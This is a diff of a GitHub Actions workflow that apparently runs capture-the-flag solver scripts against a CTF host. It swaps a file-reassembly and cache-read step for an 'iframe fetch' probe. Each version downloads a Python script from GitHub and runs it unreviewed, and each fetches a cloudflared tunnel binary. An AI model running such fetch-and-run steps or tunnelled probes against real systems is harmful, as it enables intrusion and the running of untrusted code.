@@ -7,21 +7,16 @@ on:
 jobs:
   solve:
     runs-on: ubuntu-latest
-    timeout-minutes: 6
+    timeout-minutes: 4
     steps:
-      - name: Solve fresh Document Flow Optimizer instance
+      - name: Probe iframe fetch behavior
         shell: bash
         env:
           TARGET: https://64d55bf19201477e84d7.kit.sasc.tf:443
         run: |
           set -euo pipefail
-          : > /tmp/source.b64
-          for n in 0 1 2 3 4 5; do curl -fsSL "https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/source.part${n}" >> /tmp/source.b64; done
-          base64 -d /tmp/source.b64 > /tmp/source.png
-          echo "SOURCE_SHA=$(sha256sum /tmp/source.png | cut -d' ' -f1)"
-          test "$(sha256sum /tmp/source.png | cut -d' ' -f1)" = "51262872d8d18cfb1068b4dbdbb10d491cfc47e075fe474327b0695f4f97d4c1"
-          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/cache_read_new.py -o /tmp/cache_read_new.py
+          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/iframe_probe_new.py -o /tmp/probe.py
           curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cloudflared
           chmod +x /tmp/cloudflared
-          if ! command -v pdftoppm >/dev/null || ! command -v tesseract >/dev/null; then sudo apt-get update && sudo apt-get install -y poppler-utils tesseract-ocr; fi
-          python3 /tmp/cache_read_new.py
+          if ! command -v pdftotext >/dev/null; then sudo apt-get update && sudo apt-get install -y poppler-utils; fi
+          python3 /tmp/probe.py
